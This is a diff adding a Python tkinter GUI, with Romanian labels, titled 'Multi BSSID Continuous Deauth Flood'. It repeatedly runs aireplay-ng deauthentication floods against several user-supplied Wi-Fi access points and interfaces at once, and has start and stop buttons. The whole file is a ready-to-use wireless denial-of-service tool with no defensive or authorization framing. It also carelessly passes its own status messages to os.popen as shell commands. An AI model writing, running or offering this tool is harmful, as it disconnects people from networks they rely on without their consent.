@@ -1,0 +1,81 @@
+import os
+import tkinter as tk
+from tkinter import scrolledtext
+from threading import Thread
+
+stop_flood = False
+
+attack_threads = []
+
+def execute_command(command):
+    output_text.insert(tk.END, f"[EXEC] {command}\n")
+    output_text.see(tk.END)
+
+    def run():
+        process = os.popen(command)
+        result = process.read()
+        process.close()
+        output_text.insert(tk.END, result + "\n")
+        output_text.see(tk.END)
+
+    Thread(target=run).start()
+
+def continuous_deauth(bssid, interface):
+    global stop_flood
+    stop_flood = False
+
+    def flood():
+        while not stop_flood:
+            os.system(f"aireplay-ng --deauth 1000 -a {bssid} {interface}")
+
+    thread = Thread(target=flood, daemon=True)
+    attack_threads.append(thread)
+    thread.start()
+    execute_command(f"[INFO] Continuous Deauth Flood started on {bssid} via {interface}.")
+
+def start_attack():
+    global stop_flood
+    stop_flood = False
+
+    bssids = bssid_entry.get().split(",")
+    interfaces = interface_entry.get().split(",")
+
+    if len(bssids) != len(interfaces):
+        output_text.insert(tk.END, "[EROARE] Numărul de BSSID-uri și interfețe trebuie să fie egal!\n")
+        return
+
+    for bssid, interface in zip(bssids, interfaces):
+        continuous_deauth(bssid.strip(), interface.strip())
+
+def stop_attack():
+    global stop_flood
+    stop_flood = True
+    execute_command("[INFO] Continuous Deauth Flood stopped.")
+    os.system("killall aireplay-ng")
+
+root = tk.Tk()
+root.title("Multi BSSID Continuous Deauth Flood")
+root.geometry("800x500")
+root.configure(bg="black")
+
+top_frame = tk.Frame(root, bg="black")
+top_frame.pack(side=tk.TOP, fill=tk.X, padx=10, pady=10)
+
+tk.Label(top_frame, text="BSSID-uri (separate prin virgulă):", bg="black", fg="white").pack(side=tk.LEFT, padx=5)
+bssid_entry = tk.Entry(top_frame, bg="black", fg="white", insertbackground="white", width=50)
+bssid_entry.pack(side=tk.LEFT, padx=5)
+
+tk.Label(top_frame, text="Interfețe (separate prin virgulă):", bg="black", fg="white").pack(side=tk.LEFT, padx=5)
+interface_entry = tk.Entry(top_frame, bg="black", fg="white", insertbackground="white", width=30)
+interface_entry.pack(side=tk.LEFT, padx=5)
+
+output_text = scrolledtext.ScrolledText(root, bg="black", fg="white", height=10)
+output_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+
+button_frame = tk.Frame(root, bg="black")
+button_frame.pack(side=tk.BOTTOM, fill=tk.X, padx=20, pady=10)
+
+tk.Button(button_frame, text="Start Continuous Deauth Flood", command=start_attack, bg="red", fg="white", width=40).pack(pady=5)
+tk.Button(button_frame, text="Stop Attack", command=stop_attack, bg="gray", fg="white", width=40).pack(pady=5)
+
+root.mainloop()
